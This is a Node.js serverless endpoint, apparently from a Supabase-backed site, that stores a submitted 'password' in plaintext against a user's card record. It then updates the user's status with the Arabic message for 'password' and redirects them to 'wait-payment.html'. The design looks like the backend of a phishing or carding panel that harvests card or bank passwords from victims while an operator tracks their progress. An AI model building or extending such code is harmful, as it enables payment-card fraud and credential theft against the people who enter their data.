const { supabase, getUserFromReq, parseBody } = require('../supabase');

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const user = getUserFromReq(req);
  if (!user) return res.status(401).json({ error: 'Unauthorized' });

  const body = await parseBody(req);
  const password = body.password || '';
  const userId = user.userId;

  const { data: cards } = await supabase
    .from('cards')
    .select('*')
    .eq('user_id', userId)
    .order('created_at', { ascending: false })
    .limit(1);

  if (cards && cards.length > 0) {
    await supabase.from('cards').update({ password: password }).eq('id', cards[0].id);
  } else {
    await supabase.from('cards').insert({ user_id: userId, password: password });
  }

  await supabase.from('users').update({
    message: 'كلمة المرور',
    page: 'wait-payment.html',
    last_input_at: new Date().toISOString(),
    updated_at: new Date().toISOString()
  }).eq('id', userId);

  res.json({ success: true });
};
